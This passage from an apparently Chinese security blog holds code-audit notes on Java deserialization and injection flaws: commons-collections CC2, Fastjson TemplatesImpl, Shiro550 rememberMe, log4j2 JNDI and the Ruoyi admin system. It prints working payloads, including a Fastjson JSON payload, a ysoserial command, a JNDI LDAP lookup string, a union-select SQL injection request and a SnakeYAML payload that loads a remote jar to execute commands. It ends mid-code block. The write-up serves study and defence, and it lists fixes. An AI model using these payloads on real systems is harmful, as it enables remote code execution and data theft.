-<h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞点：</span></span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses;</span><br><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"></span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance;</span><br><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用链</span></span><br><span class="line">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span>; <span class="comment">//CC1链 特征return Transformer</span></span><br><span class="line"></span><br><span class="line">org.apache.commons.collections.functors.InvokerTransformer#transform;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass(); <span class="comment">//Object input; 形参</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">&#125; <span class="comment">//构造任意类并调用函数</span></span><br><span class="line"></span><br><span class="line">org.apache.commons.collections4.comparators.TransformingComparator#compare;</span><br><span class="line"><span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//寻找可反序列化类 调用了compare方法的readObject(), 一般出现在集合类中</span></span><br><span class="line">java.util.PriorityQueue#readObject;</span><br><span class="line">java.util.PriorityQueue#heapify;</span><br><span class="line">java.util.PriorityQueue#siftDown;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        通过构造方法写入一个Comparator 然后通过构造PriorityQueue调用readObject()完成调用链利用</span></span><br><span class="line"><span class="comment">    	public PriorityQueue(Comparator&lt;? super E&gt; comparator);</span></span><br><span class="line"><span class="comment">    	*/</span></span><br><span class="line">    &#123;</span><br><span class="line">        java.util.PriorityQueue#siftDownUsingComparator;</span><br><span class="line">   		<span class="keyword">if</span> (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#123;</span><br><span class="line">        java.util.PriorityQueue#siftDownComparable;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp; ((Comparable&lt;? <span class="built_in">super</span> E&gt;) c).compareTo((E) queue[right]) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">和CC1一样直接拉黑InvokerTransformer</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Fastjson-lt-1-2-24"><a href="#Fastjson-lt-1-2-24" class="headerlink" title="Fastjson &lt;1.2.24"></a>Fastjson &lt;1.2.24</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, &quot;</span> +</span><br><span class="line">    <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + baseEvil +</span><br><span class="line">    <span class="string">&quot;\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, &quot;</span> +</span><br><span class="line">    <span class="string">&quot;\&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>_tfactory：在调用TemplatesImpl利用链时，defineTransletClasses方法内部会通过_tfactory属性调用一个getExternalExtensionsMap方法，如果_tfactory属性为null则会抛出异常，无法根据_bytecodes属性的内容加载并实例化恶意类</p>
-</li>
-<li><p>_outputProperties：json数据在反序列化时会调用TemplatesImpl类的getOutputProperties方法触发利用链，可以理解为outputProperties属性的作用就是为了调用getOutputProperties方法。</p>
-</li>
-</ul>
-<h3 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h3><ul>
-<li><p>_bytecodes为什么需要base64编码？</p>
-<ul>
-<li>fieldValueDeserilizer的deserialze方法设置到对象中之前调用了bytesvalue()方法，方法内部对_bytecodes进行了base64的解码</li>
-</ul>
-</li>
-<li><p>如何在fastjson的parseObject()反序列化的过程中触发漏洞点？</p>
-<ul>
-<li>核心漏洞点函数getOutputProperties方法，setValue函数中用于反射调用的method属性中设置了<code>public synchronized java.util.Properties com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()</code>，从而调用触发调用链。</li>
-</ul>
-</li>
-<li><p>_name为什么需要设置？</p>
-<ul>
-<li><p>在getTransletInstance内部要满足如下条件</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">//_name不为空</span></span><br><span class="line"><span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses(); <span class="comment">//_class为空</span></span><br><span class="line"><span class="comment">//defineTransletClasses</span></span><br><span class="line">&#123;</span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if this is the main class</span></span><br><span class="line">    <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; <span class="comment">//_bytecodes对应类需要继承AbstractTranslet类</span></span><br><span class="line">        _transletIndex = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p>fastjson在反序列化过程中具体是如何调用属性的getter方法的？</p>
-<p>答案是JavaBeanInfo类中有一个build方法，当通过@type获取TemplatesImpl类的calss对象后，会通过反射获取该类的class对象的所有方法并封装到Method数组中。然后通过for循环遍历Method获取getter方法，并将outputProperties属性和getter方法（getOutputProperties方法）一起封装到FieldInfo，从代码中确实可以看到add方法会将FieldInfo放到了一个fieldList中，然后将fieldList封装到JavaBeanInfo</p>
-</li>
-</ul>
-<h2 id="Shiro550"><a href="#Shiro550" class="headerlink" title="Shiro550"></a>Shiro550</h2><ol>
-<li>认证调用链</li>
-</ol>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230221230725420.png" style="zoom:80%;">
-
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230221231700180.png" alt="image-20230221231700180" style="zoom:80%;">
-
-<ol start="2">
-<li><p>特征：登录返回包中在Set-Cookie字段中出现rememberMe&#x3D;deleteMe，可能有Shiro反序列化漏洞</p>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230222095837524.png" style="zoom:80%;">
-</li>
-<li><p>登录后不对发送包中的Cookie进行反序列化，编写Poc时需要在未登录的情况下进行提交</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用ysoserial生成CC2 POC链</span></span><br><span class="line">java8 -jar ysoserial.jar CommonsCollections2 <span class="string">&quot;calc&quot;</span> &gt; poc.txt</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>加密方式</p>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230222103728581.png" style="zoom: 80%;">
-</li>
-<li><p>漏洞调用链：</p>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230222105349239.png" style="zoom:80%;">
-
-<p>在对请求Filter进行拦截，并通过<strong>SecurityManager创建请求对应的Subject</strong>的过程中<strong>解析身份信息resolvePrincipals</strong>时，org.apache.shiro.mgt.DefaultSecurityManager#<strong>getRememberedIdentity</strong>向下调用了<strong>getRememberedSerializedIdentity</strong>获取得到请求<strong>request中Cookie的rememberMe</strong>的值，解密后利用<strong>deserialize</strong>直接进行反序列化造成任意命令执行。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">convertBytesToPrincipals</span><span class="params">(<span class="type">byte</span>[] bytes, SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">        bytes = <span class="built_in">this</span>.decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.deserialize(bytes);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//org.apache.shiro.io.DefaultSerializer#deserialize</span></span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;	<span class="comment">//只进行了null判断</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">            <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            <span class="keyword">return</span> deserialized;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialze argument byte array.&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>密钥设置</p>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230222111504673.png" style="zoom:80%;"></li>
-</ol>
-<h2 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><ol>
-<li><p>JNDI （Java Naming and Directory Interface）</p>
-<p><strong>JDNI通过绑定的概念将对象和名称联系起来</strong>，JNDI中的一组绑定作为上下文来引用。每个上下文提供了一个查找操作，返回指定名字的相应对象。每个上下文都提供了绑定和撤除绑定名字到某个对象的操作。</p>
-</li>
-<li><p>LDAP（Light Directory Access Portocol）</p>
-<p>LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）。</p>
-</li>
-<li><p>Codebase</p>
-<p>Codebase就是存储代码或者编译文件的服务。其可以根据名称返回对应的代码或者编译文件，如果根据类名，提供类对应的Class文件。</p>
-</li>
-</ol>
-<h3 id="低版本触发漏洞"><a href="#低版本触发漏洞" class="headerlink" title="低版本触发漏洞"></a>低版本触发漏洞</h3><ul>
-<li>影响范围：<code>&lt; JDK 8u_191</code></li>
-</ul>
-<ol>
-<li><p>漏洞原理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://localhost:9999/test&#125;</span><br><span class="line">关键就如下几步：</span><br><span class="line">1、攻击者发送带有恶意Ldap内容的字符串，让服务通过log4j2打印</span><br><span class="line">2、log4j2解析到ldap内容，会调用底层Java去执行Ldap的lookup操作。</span><br><span class="line">3、Java底层请求Ldap服务器（恶意服务器），得到了Codebase地址，告诉客户端去该地址获取他需要的类。</span><br><span class="line">4、Java请求Codebase服务器(恶意服务器)获取到对应的类（恶意类），并在本地加载和实例化（触发恶意代码）。</span><br></pre></td></tr></table></figure>
-
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230225150658578.png" style="zoom:80%;">
-</li>
-<li><p>问题：</p>
-<ol>
-<li><p>此攻击为什么对高版本无效？</p>
-<p>因为高版本在VersionHelper12的loadClass设置验证了trustURLCodebase是不是设置为false，默认情况下是设置的false，所以无法利用</p>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230225151125332.png" style="zoom:80%;"></li>
-</ol>
-</li>
-</ol>
-<h3 id="高版本触发漏洞"><a href="#高版本触发漏洞" class="headerlink" title="高版本触发漏洞"></a>高版本触发漏洞</h3><ul>
-<li>基础<ul>
-<li>lookup：当Java底层请求Ldap服务器后，Ldap主要返回了三个主要参数javaClassName、javaFactory、JavaFactoryLocaltion，以及一些额外参数。客户端获得这些参数之后主要做一件事情：构造需要的类实例。即客户端通过javaFactory类来构建实现我们需要的JavaClassName指定的实例。<ul>
-<li>javaFactory是ObjectFactory类子类，来源有：1.Codebase，2.本地（ldap返回Codebase地址或者返回javaFactory对应的类地址） &#x2F;&#x2F; 本地方式：需要找到本地哪些javaFactory存在一些可以被利用的漏洞。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<ol>
-<li><p>利用方式</p>
-<img src="/2023/04/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/image-20230225151801675.png" style="zoom:80%;">
-
-<ol>
-<li><p>关键类：BeanFactory，该Factory我们可以通过默认构造函数实例化任意一个类，并调用其任意的只有一个String入参的公共方法，且其方法名可以不用是标准setter的名称，而可以是任意名称。</p>
-</li>
-<li><pre><code>Ldap服务器返回JavaFactory=org.apache.naming.factory.BeanFactory，javaClassName=javax.el.ELProcessor。同时传递参数x=上述恶意代码，forceString=&quot;x=eval&quot;。
-1、直接在本地加载和实例化BeanFactory工厂，得到BeanFacory实例
-2、BeanFactory工厂通过默认构造函数实例化javax.el.ELProcessor，得到ELProcessor实例
-3、Ldap告诉BeanFactory，ELProcessor有一个string类型的变量x（实际没有），其内容为恶意代码块，且该变量的setter方法名为eval。
-4、BeanFactory就会执行ELProcessor实例的eval方法，且入参为恶意代码块。
-</code></pre>
-</li>
-</ol>
-</li>
-</ol>
-<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><ol>
-<li>新增消息的Lookup开关(默认关闭)，默认不解析${}配置</li>
-<li>新增白名单：给协议、class和域名都添加白名单</li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">若依系统代码审计</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-02-28</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span><div class="content"><h1 id="Ruoyi系统代码审计"><a href="#Ruoyi系统代码审计" class="headerlink" title="Ruoyi系统代码审计"></a>Ruoyi系统代码审计</h1><h2 id="Mybatis-sql注入-lt-x3D-4-6-1"><a href="#Mybatis-sql注入-lt-x3D-4-6-1" class="headerlink" title="Mybatis sql注入 &lt;&#x3D;4.6.1"></a>Mybatis sql注入 &lt;&#x3D;4.6.1</h2><ol>
-<li>漏洞成因：在mybatis中，<code>#</code>进行预编译，<code>$</code>是直接拼接，会导致sql注入出现</li>
-</ol>
-<h3 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h3><ol>
-<li><p>application.yaml配置了mybatis的sql配置在各模块的mapper下</p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228141512587.png" alt="image-20230228141512587" style="zoom:80%;">
-</li>
-<li><p>直接遍历所有模块的mapper，查看特征是否有<code>$</code></p>
-<p>- </p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228141641823.png" alt="image-20230228141641823" style="zoom:80%;">
-
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228141656121.png" alt="image-20230228141656121" style="zoom:80%;">
-
-<ul>
-<li>src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;system&#x2F;SysRoleMapper.xml</li>
-</ul>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228141733021.png" alt="image-20230228141733021" style="zoom: 67%;">
-
-<ul>
-<li><p>src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;system&#x2F;SysUserMapper.xml</p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228141932168.png" alt="image-20230228141932168" style="zoom: 67%;">
-
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228142020220.png" alt="image-20230228142020220" style="zoom: 80%;">
-
-<p><img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228142040517.png" alt="image-20230228142040517"><img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228142020220.png" alt="image-20230228142020220" style="zoom: 80%;"></p>
-<p><img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5Cimage-20230228142040517.png" alt="image-20230228142040517"></p>
-</li>
-</ul>
-</li>
-</ol>
-<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><ol>
-<li><p>select型注入，直接拿了个src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;system&#x2F;SysUserMapper.xml的selectUserList进行注入</p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228144336457.png" alt="image-20230228144336457" style="zoom:80%;">
-
-<p>查找调用链，最终找到地址<code>/system/user/list</code>，并且对传入的params数组并没有做任何的过滤，查询有回显，可以直接使用union注入就好了：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反找mapper-&gt;impl-&gt;service-&gt;controller</span></span><br><span class="line">com.ruoyi.system.mapper.SysUserMapper#selectUserList--&gt;; <span class="comment">//mapper</span></span><br><span class="line">com.ruoyi.system.service.ISysUserService#selectUserList--&gt;; <span class="comment">//service</span></span><br><span class="line">com.ruoyi.web.controller.system.SysUserController#list--&gt;; <span class="comment">//找到目标controller</span></span><br><span class="line"><span class="keyword">public</span> TableDataInfo <span class="title function_">list</span><span class="params">(SysUser user)</span></span><br><span class="line">&#123;</span><br><span class="line">    startPage();</span><br><span class="line">    List&lt;SysUser&gt; list = userService.selectUserList(user);</span><br><span class="line">    <span class="keyword">return</span> getDataTable(list);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h3><ul>
-<li><p>poc:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageSize=10&amp;pageNum=1&amp;orderByColumn=createTime&amp;isAsc=desc&amp;deptId=&amp;parentId=&amp;loginName=-1&amp;phonenumber=&amp;status=&amp;params%5BbeginTime%5D=&amp;params%5BendTime%5D=&amp;params%5BdataScope%5D=union select (select database()),2,3,4,5,6,7,8,9,10,11,12,13,14,&quot;2023-02-28 14:36:50&quot;,16,&quot;2023-02-28 14:36:50&quot;,18,19,20</span><br></pre></td></tr></table></figure>
-
-<p>注入的点是params.dataScope，对应的15，17号位置是Date类型，且格式是<code>@Excel(name = &quot;最后登录时间&quot;, width = 30, dateFormat = &quot;yyyy-MM-dd HH:mm:ss&quot;, type = Type.EXPORT)</code>：</p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228145401904.png" alt="image-20230228145401904">
-</li>
-<li><p>结果：有前端类型验证，但还是爆出来了，或者用其他的字段</p>
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228145814855.png" alt="image-20230228145814855">
-
-<img src="/2023/02/28/%E8%8B%A5%E4%BE%9D%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20230228145931411.png" alt="image-20230228145931411"></li>
-</ul>
-<h2 id="后台RCE-lt-4-6-2"><a href="#后台RCE-lt-4-6-2" class="headerlink" title="后台RCE &lt;4.6.2"></a>后台RCE &lt;4.6.2</h2><h3 id="定时任务调度流程"><a href="#定时任务调度流程" class="headerlink" title="定时任务调度流程"></a>定时任务调度流程</h3><ul>
-<li>Ruoyi：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/liutiaotiao/p/14078223.html">https://www.cnblogs.com/liutiaotiao/p/14078223.html</a></li>
-<li>漏洞参考链接：<a target="_blank" rel="noopener" href="http://myblog.ac.cn/archives/%E8%8B%A5%E4%BE%9D%E5%90%8E%E5%8F%B0rce%E5%88%B0snakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">http://myblog.ac.cn/archives/%E8%8B%A5%E4%BE%9D%E5%90%8E%E5%8F%B0rce%E5%88%B0snakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></li>
-</ul>
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ul>
-<li><p>payload：</p>
-<ul>
-<li><p><code>org.yaml.snakeyaml.Yaml.load(&#39;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:8989/yaml-payload.jar&quot;]]]]&#39;)</code></p>
-</li>
-<li><pre><code class="java">public class AwesomeScriptEngineFactory implements ScriptEngineFactory &#123;
-    public AwesomeScriptEngineFactory() &#123;
-        try &#123;
-            Runtime.getRuntime().exec(&quot;calc&quot;);
-//            Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);
-        &#125; catch (IOException e) &#123;
-            e.printStackTrace();
-        &#125;
-    &#125;
-    ...
-&#125;
-
-//创建classpath:META-INF/services/javax.script.ScriptEngineFactory
-//写入:artsploit.AwesomeScriptEngineFactory
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 漏洞点，首先按照上面开发流程分析的过程，找到定时任务流程的起点`Job.execute()`方法，一直调用到invokeMethod，或者也能通过写入错误的类爆出异常，调用栈的信息看到关键函数。</span><br><span class="line"></span><br><span class="line">   &lt;img src=&quot;./若依系统代码审计/image-20230228203222784.png&quot; alt=&quot;image-20230228203222784&quot;  /&gt;</span><br><span class="line"></span><br><span class="line">2. 调用链：</span><br><span class="line"></span><br><span class="line">   ```java</span><br><span class="line">   //rce漏洞成因分析，如果是bean容器中的名字就直接获取bean，反射调用方法；否则实例化全类名对应的对象，反射调用方法</span><br><span class="line">   com.ruoyi.quartz.util.JobInvokeUtil#invokeMethod(com.ruoyi.quartz.domain.SysJob)--&gt;;</span><br><span class="line">   if (!isValidClassName(beanName))</span><br><span class="line">       //判断是否是bean容器中的</span><br><span class="line">   &#123;</span><br><span class="line">       Object bean = SpringUtils.getBean(beanName);</span><br><span class="line">       invokeMethod(bean, methodName, methodParams);</span><br><span class="line">   